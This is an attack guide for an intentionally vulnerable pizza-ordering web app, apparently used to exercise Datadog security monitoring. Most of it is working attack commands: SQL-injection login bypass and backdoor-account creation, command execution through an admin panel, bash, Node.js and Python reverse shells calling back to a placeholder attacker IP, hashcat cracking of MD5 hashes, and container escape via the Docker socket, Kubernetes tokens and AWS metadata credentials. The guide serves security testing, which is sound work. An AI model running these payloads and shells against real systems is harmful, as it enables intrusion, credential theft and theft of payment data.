# Web Attacks for Container Access

## Overview

This guide demonstrates web-based attack vectors that can lead to container access or Remote Code Execution (RCE) in the intentionally vulnerable Pizza Coffee application.

## ⚠️ Legal Notice

These attacks are for **authorized security testing only** on your own infrastructure. Unauthorized access to systems is illegal.

---

## Attack Vectors (Easiest to Hardest)

### 1. Command Injection via Admin Panel ⭐ EASIEST - **IMPLEMENTED**

**Vulnerability**: Direct command execution in admin panel
**Location**: `/admin/system/execute`
**Severity**: CRITICAL

#### Prerequisites
- Admin access (can be obtained via session hijacking or SQL injection - see Section 8)

#### Test Command Injection
```bash
# First, get admin access (see section 8 below)
# Then execute system commands directly

curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
  -d '{"command": "whoami"}'

# Read sensitive files
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
  -d '{"command": "cat /etc/passwd"}'

# List container environment
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
  -d '{"command": "env"}'

# Get reverse shell (start listener first: nc -lvnp 4444)
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
  -d '{"command": "bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""}'
```

---

### 2. SQL Injection to Authentication Bypass ⭐⭐ EASY - **IMPLEMENTED**

**Vulnerability**: Multiple SQL injection points throughout the application
**Severity**: CRITICAL

#### Attack Point 1: Login Bypass
```bash
# Bypass authentication with SQL injection
curl -X POST "http://localhost:3000/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1'--&password=anything"

# This will log you in as the first user in the database (usually admin)
```

#### Attack Point 2: Menu Category Filter (After Login)
```bash
# Extract database information
curl "http://localhost:3000/orders/menu?category=pizza' UNION SELECT id,name,price,description,category,available FROM products--" \
  -H "Cookie: session=YOUR_SESSION_COOKIE"

# Read files using LOAD_FILE (if MySQL FILE privilege exists)
curl "http://localhost:3000/orders/menu?category=pizza' UNION SELECT 1,LOAD_FILE('/etc/passwd'),'3','4','5',1--" \
  -H "Cookie: session=YOUR_SESSION_COOKIE"

# Get MySQL version and user
curl "http://localhost:3000/orders/menu?category=pizza' UNION SELECT 1,@@version,user(),database(),'5',1--" \
  -H "Cookie: session=YOUR_SESSION_COOKIE"
```

#### Attack Point 3: Create Admin User via Registration
```bash
# Register with SQL injection to create admin account
curl -X POST "http://localhost:3000/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=backdoor&password=hacked123'), (999, 'backdoor', '21232f297a57a5a743894a0e4a801fc3', 'backdoor@evil.com', 1, NOW())--"

# Now login with: username=backdoor, password=admin
```

---

### 3. Arbitrary SQL Execution via Admin Panel ⭐⭐⭐ EASY - **IMPLEMENTED**

**Vulnerability**: Direct SQL query execution in admin panel
**Location**: `/admin/database/query`
**Severity**: CRITICAL

#### Execute Arbitrary SQL (Requires Admin Access)
```bash
# Read any table
curl -X POST "http://localhost:3000/admin/database/query" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{"query": "SELECT * FROM users"}'

# Get all payment information (including credit cards in plaintext!)
curl -X POST "http://localhost:3000/admin/database/query" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{"query": "SELECT * FROM payment_transactions"}'

# Create backdoor user
curl -X POST "http://localhost:3000/admin/database/query" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{"query": "INSERT INTO users (username, password, is_admin) VALUES (\"backdoor2\", \"5f4dcc3b5aa765d61d8327deb882cf99\", 1)"}'

# Read files using LOAD_FILE (if MySQL has FILE privilege)
curl -X POST "http://localhost:3000/admin/database/query" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{"query": "SELECT LOAD_FILE(\"/etc/passwd\")"}'
```

---

### 4. Sensitive Data Exposure ⭐⭐⭐ EASY - **IMPLEMENTED**

**Vulnerability**: Multiple sensitive data leaks
**Severity**: HIGH

#### Attack Point 1: Password Hashes in JWT Tokens
```bash
# Login and extract JWT (contains password hash!)
curl -X POST "http://localhost:3000/auth/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser", "password": "password"}'

# Decode JWT at jwt.io or:
# The JWT payload contains: id, username, email, isAdmin, AND password hash!
# This is a CRITICAL vulnerability
```

#### Attack Point 2: Credit Card Data in Plaintext
```bash
# Login as any user
# View payment history (contains FULL credit card numbers and CVVs!)
curl "http://localhost:3000/payment/history" \
  -H "Cookie: session=YOUR_SESSION_COOKIE"

# Response includes:
# - Full credit card numbers
# - CVV codes
# - Card holder names
# - PIX keys
# All in PLAINTEXT!
```

#### Attack Point 3: All User Password Hashes Exposed
```bash
# Login as admin (see section 2)
curl "http://localhost:3000/admin/users" \
  -H "Cookie: session=YOUR_ADMIN_SESSION"

# All MD5 password hashes are exposed in the admin panel!
# Crack them using: https://crackstation.net/
```

#### Attack Point 4: Session Manipulation (Client-Side Sessions)
```javascript
// The app uses cookie-session with weak secret and httpOnly: false
// Session data is stored CLIENT-SIDE and accessible via JavaScript

// In browser console:
console.log(document.cookie);

// Decode session
const sessionCookie = document.cookie.split('session=')[1].split(';')[0];
const decoded = atob(sessionCookie.split('.')[0]);
console.log(decoded);

// Example: {"userId":1,"user":{"id":1,"username":"user","isAdmin":false}}

// To become admin, forge a new session with weak secret "insecure-secret"
// Use keygrip library to sign your forged session
```

---

### 5. IDOR (Insecure Direct Object Reference) ⭐⭐⭐ MEDIUM - **IMPLEMENTED**

**Vulnerability**: Access other users' data without authorization
**Severity**: HIGH

#### Attack Point 1: View Any User's Orders
```bash
# Login as user ID 1
# View user ID 2's orders by manipulating the userId parameter
curl "http://localhost:3000/orders/my-orders?userId=2" \
  -H "Cookie: session=USER1_SESSION_COOKIE"

# Enumerate all users' orders
for i in {1..100}; do
  echo "Checking user $i:"
  curl -s "http://localhost:3000/orders/my-orders?userId=$i" \
    -H "Cookie: session=YOUR_SESSION_COOKIE" | grep -o "Order #[0-9]*"
done
```

#### Attack Point 2: View Any Order Confirmation
```bash
# Access any order confirmation without authorization check
curl "http://localhost:3000/orders/confirmation/1" \
  -H "Cookie: session=ANY_USER_SESSION"

# Enumerate all orders
for i in {1..50}; do
  echo "Order $i:"
  curl -s "http://localhost:3000/orders/confirmation/$i" \
    -H "Cookie: session=YOUR_SESSION_COOKIE"
done
```

#### Attack Point 3: Check Any PIX Payment Status
```bash
# Check any order's PIX payment status without ownership verification
curl "http://localhost:3000/payment/pix/status/1" \
  -H "Cookie: session=ANY_USER_SESSION"

# Enumerate payment statuses
for i in {1..50}; do
  curl -s "http://localhost:3000/payment/pix/status/$i" \
    -H "Cookie: session=YOUR_SESSION_COOKIE"
done
```

---

### 6. Weak Cryptography - MD5 Password Cracking ⭐⭐⭐ MEDIUM - **IMPLEMENTED**

**Vulnerability**: MD5 hashing for passwords (no salt, weak algorithm)
**Severity**: HIGH

#### Extract and Crack Password Hashes
```bash
# 1. Get password hashes via SQL injection
curl -X POST "http://localhost:3000/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' UNION SELECT id,username,password,email,is_admin,created_at FROM users--&password=x"

# 2. Or via admin panel
curl -X POST "http://localhost:3000/admin/database/query" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{"query": "SELECT username, password FROM users"}' | jq '.'

# 3. Crack MD5 hashes online
# Use: https://crackstation.net/
# Or: https://md5decrypt.net/

# 4. Use hashcat for offline cracking
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Common passwords and their MD5:
# password -> 5f4dcc3b5aa765d61d8327deb882cf99
# admin -> 21232f297a57a5a743894a0e4a801fc3
# 123456 -> e10adc3949ba59abbe56e057f20f883e
```

---

### 7. Username Enumeration ⭐⭐⭐ MEDIUM - **IMPLEMENTED**

**Vulnerability**: Different error messages for valid/invalid usernames
**Location**: `/auth/reset-password`
**Severity**: MEDIUM

#### Enumerate Valid Usernames
```bash
# Test for valid username (returns success message)
curl -X POST "http://localhost:3000/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin"}'
# Response: {"success": "Password reset link sent..."}

# Test for invalid username (returns error)
curl -X POST "http://localhost:3000/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"username": "nonexistent"}'
# Response: {"error": "User not found"}

# Brute force usernames
for username in admin root user test administrator manager support; do
  echo "Testing: $username"
  response=$(curl -s -X POST "http://localhost:3000/auth/reset-password" \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"$username\"}")
  echo "$response"
  echo ""
done
```

---

### 8. Information Disclosure ⭐⭐⭐ MEDIUM - **IMPLEMENTED**

**Vulnerability**: Verbose error messages exposing internals
**Severity**: MEDIUM

#### Trigger Verbose Errors
```bash
# SQL syntax error reveals database structure
curl -X POST "http://localhost:3000/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'&password=test"
# Error reveals: MySQL error messages, table structure, query syntax

# Trigger database errors with detailed information
curl "http://localhost:3000/orders/menu?category=pizza' AND (SELECT * FROM nonexistent_table)--"

# Payment processing errors expose internal details
curl -X POST "http://localhost:3000/payment/process" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"orderId": "invalid", "paymentMethod": "credit"}'
```

---

## Complete Attack Chain Examples

### Chain 1: From SQL Injection to Container Access (EASIEST PATH)

```bash
# Step 1: SQL Injection to create admin user via registration
curl -X POST "http://localhost:3000/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=backdoor&password=hacked123'), (999, 'backdoor', '21232f297a57a5a743894a0e4a801fc3', 'backdoor@evil.com', 1, NOW())--"

# Step 2: Login as the new admin user
curl -X POST "http://localhost:3000/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt \
  -d "username=backdoor&password=admin"

# Step 3: Verify admin access
curl "http://localhost:3000/admin/dashboard" \
  -b cookies.txt

# Step 4: Execute system commands via admin panel
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"command": "whoami && hostname && id"}'

# Step 5: Enumerate the container
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"command": "ls -la / && cat /etc/passwd && env"}'

# Step 6: Get reverse shell
# First, start listener on your machine: nc -lvnp 4444
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"command": "bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""}'

# Now you have shell access to the container!
```

### Chain 2: From Login Bypass to Data Exfiltration

```bash
# Step 1: Bypass authentication using SQL injection
curl -X POST "http://localhost:3000/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt \
  -d "username=admin' OR '1'='1'--&password=anything"

# Step 2: Verify access (you're logged in as first user - usually admin)
curl "http://localhost:3000/admin/dashboard" -b cookies.txt

# Step 3: Execute SQL to dump all sensitive data
curl -X POST "http://localhost:3000/admin/database/query" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"query": "SELECT * FROM users"}' | jq '.' > users.json

curl -X POST "http://localhost:3000/admin/database/query" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"query": "SELECT * FROM payment_transactions"}' | jq '.' > payments.json

# Step 4: Extract and crack password hashes
cat users.json | jq -r '.results[].password' > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show

# Step 5: Use cracked passwords to access other accounts
# Now you have full access to all user accounts and credit card data!
```

### Chain 3: From Regular User to Admin via IDOR + Session Manipulation

```bash
# Step 1: Create a regular user account
curl -X POST "http://localhost:3000/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=normaluser&password=password123"

# Step 2: Login as regular user
curl -X POST "http://localhost:3000/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt \
  -d "username=normaluser&password=password123"

# Step 3: Use IDOR to enumerate other users' orders and find admin user ID
for i in {1..10}; do
  echo "User ID $i:"
  curl -s "http://localhost:3000/orders/my-orders?userId=$i" -b cookies.txt | grep "username"
done

# Step 4: Extract JWT token and decode it
curl -X POST "http://localhost:3000/auth/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "normaluser", "password": "password123"}' | jq -r '.token' > jwt.txt

# Decode JWT at jwt.io - it contains password hash!

# Step 5: Forge session cookie with admin privileges
# (Requires keygrip library with secret "insecure-secret")
# Once forged, set cookie and access admin panel
```

---

## Reverse Shell Payloads

Once you achieve RCE via the admin panel command execution, establish a reverse shell:

### Bash Reverse Shell (via Admin Command Execution)
```bash
# Step 1: Start listener on your attacking machine
nc -lvnp 4444

# Step 2: Execute reverse shell via admin panel
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{"command": "bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""}'
```

### Node.js Reverse Shell (via Admin Command Execution)
```bash
# Start listener
nc -lvnp 4444

# Execute Node.js reverse shell
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{
    "command": "node -e \"var net = require(\\\"net\\\"); var spawn = require(\\\"child_process\\\").spawn; var client = new net.Socket(); client.connect(4444, \\\"YOUR_IP\\\", function(){ var sh = spawn(\\\"/bin/sh\\\",[]); client.write(\\\"Connected\\\\n\\\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });\""
  }'
```

### Python Reverse Shell (if Python is installed in container)
```bash
curl -X POST "http://localhost:3000/admin/system/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_ADMIN_SESSION" \
  -d '{
    "command": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"YOUR_IP\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\""
  }'
```

---

## Container Escape Techniques (Post-Access)

Once inside the container, try to escape:

### 1. Check Container Privileges
```bash
# Check if running as root
id

# Check capabilities
capsh --print

# Check if privileged container
cat /proc/self/status | grep CapEff
```

### 2. Check for Docker Socket
```bash
# If Docker socket is mounted
ls -la /var/run/docker.sock

# If accessible, spawn privileged container
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

### 3. Check for Kubernetes Service Account
```bash
# Check for service account token
ls /var/run/secrets/kubernetes.io/serviceaccount/

# If present, interact with Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/pods
```

### 4. Look for Cloud Metadata
```bash
# AWS metadata (IMDSv1)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS metadata (IMDSv2)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### 5. Check Mounted Volumes
```bash
# List mounted volumes
mount | grep -v "^overlay"

# Look for sensitive paths
ls -la /host
ls -la /var/lib/docker
```

---

## Attack Cheat Sheet - IMPLEMENTED VULNERABILITIES

| Attack Type | Difficulty | Endpoint | Severity | Auth Required | Notes |
|-------------|------------|----------|----------|---------------|-------|
| Command Injection | Easy | `/admin/system/execute` | CRITICAL | Admin | Direct RCE - Easiest path to container access |
| SQL Injection - Login | Easy | `/auth/login` | CRITICAL | No | Authentication bypass |
| SQL Injection - Register | Easy | `/auth/register` | CRITICAL | No | Create admin accounts |
| SQL Injection - Menu | Easy | `/orders/menu` | HIGH | Yes | Data extraction via category filter |
| SQL Injection - Admin Search | Easy | `/admin/orders` | HIGH | Admin | Search field vulnerable |
| Arbitrary SQL Execution | Easy | `/admin/database/query` | CRITICAL | Admin | Execute any SQL query |
| IDOR - View Orders | Medium | `/orders/my-orders` | HIGH | Yes | View any user's orders via userId param |
| IDOR - Order Details | Medium | `/orders/confirmation/:id` | HIGH | Yes | View any order without ownership check |
| IDOR - PIX Status | Medium | `/payment/pix/status/:id` | MEDIUM | Yes | Check any payment status |
| Password Hash Exposure | Easy | Multiple | HIGH | Varies | MD5 hashes exposed everywhere |
| Credit Card Exposure | Easy | `/payment/history` | CRITICAL | Yes | Plaintext card numbers & CVVs |
| JWT with Password Hash | Easy | `/auth/api/login` | CRITICAL | No | JWT contains password hash |
| Session Manipulation | Medium | Cookie-session | HIGH | Yes | Client-side sessions with weak secret |
| Username Enumeration | Medium | `/auth/reset-password` | MEDIUM | No | Different responses for valid/invalid users |
| Information Disclosure | Easy | Multiple | MEDIUM | Varies | Verbose error messages |
| Weak Crypto (MD5) | Medium | All auth endpoints | HIGH | No | No salt, easily crackable |

---

## Testing Workflow

### 1. Reconnaissance
```bash
# Map the application
curl http://localhost:3000 > homepage.html
grep -E "(href|src|action)=" homepage.html

# Find API endpoints
curl http://localhost:3000/api
curl http://localhost:3000/api/docs

# Check for common files
curl http://localhost:3000/robots.txt
curl http://localhost:3000/package.json
curl http://localhost:3000/.git/config
```

### 2. Vulnerability Scanning
```bash
# SQL Injection
sqlmap -u "http://localhost:3000/api/search?q=test" --batch

# XSS
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}'

# Command Injection
curl "http://localhost:3000/api/ping?host=127.0.0.1;id"
```

### 3. Exploitation
```bash
# Choose highest impact vulnerability
# Establish RCE
# Get reverse shell
# Enumerate container
# Attempt container escape
```

### 4. Post-Exploitation
```bash
# Inside container
whoami
id
ps aux
ls -la /app
cat /app/.env
ls /run/secrets/
env
cat /proc/1/environ
```

---

## Automation Scripts

### Auto-Test All Vulnerabilities
```bash
#!/bin/bash
TARGET="http://localhost:3000"

echo "[+] Testing SQL Injection..."
curl -s "$TARGET/api/search?q=' OR '1'='1" | grep -q "pizza" && echo "✓ SQLi Vulnerable"

echo "[+] Testing XSS..."
curl -s -X POST "$TARGET/api/comment" \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}' | grep -q "script" && echo "✓ XSS Vulnerable"

echo "[+] Testing Command Injection..."
curl -s "$TARGET/api/ping?host=127.0.0.1;id" | grep -q "uid=" && echo "✓ Command Injection Vulnerable"

echo "[+] Testing Path Traversal..."
curl -s "$TARGET/api/file?path=../../../../etc/passwd" | grep -q "root:" && echo "✓ Path Traversal Vulnerable"

echo "[+] Testing SSTI..."
curl -s -X POST "$TARGET/api/comment" \
  -H "Content-Type: application/json" \
  -d '{"text":"<%=7*7%>"}' | grep -q "49" && echo "✓ SSTI Vulnerable"
```

---

## Detection by Datadog

All these attacks should be detected by:

- **Datadog ASM**: Real-time attack detection
  - SQL injection attempts
  - XSS payloads
  - Command injection
  - Path traversal attempts

- **Datadog CWS**: Runtime security
  - Process execution (shells, nc, curl)
  - File access violations
  - Network connections from containers

- **Datadog IAST**: Code-level vulnerabilities
  - SQL injection sinks
  - Command execution sinks
  - Path traversal vulnerabilities

---

## Vulnerabilities NOT Implemented

The following attack vectors were mentioned in earlier versions of this documentation but are **NOT implemented** in the current application:

❌ **Server-Side Template Injection (SSTI)** - No endpoints that render user input through template engines
❌ **Path Traversal via `/api/file`** - This endpoint does not exist
❌ **File Upload Command Injection** - No file upload functionality implemented
❌ **Prototype Pollution** - Not actively vulnerable
❌ **NoSQL Injection** - Application uses MySQL, not MongoDB
❌ **Deserialization Attack** - No serialization libraries in use
❌ **XSS (Cross-Site Scripting)** - No endpoints that render unsanitized user input

If you need these vulnerabilities for testing, they would need to be added to the application.

---

## Why These Attacks Work (Intentional Vulnerabilities)

This application is **intentionally vulnerable** for security testing and educational purposes. The attacks work because:

- ❌ No input validation or sanitization
- ❌ No output encoding
- ❌ No prepared statements (SQL injection everywhere)
- ❌ Direct command execution without sanitization
- ❌ No authorization checks (IDOR vulnerabilities)
- ❌ Weak cryptography (MD5 without salt)
- ❌ Client-side session storage with weak secrets
- ❌ Sensitive data in plaintext (credit cards, passwords in JWTs)
- ❌ No rate limiting
- ❌ Verbose error messages exposing internals
- ❌ No WAF/RASP protection
- ❌ httpOnly: false on cookies (JavaScript accessible)
- ❌ secure: false on cookies (works over HTTP)

**⚠️ WARNING: This is a vulnerable test application for AUTHORIZED SECURITY TESTING ONLY. Never deploy this in production!**
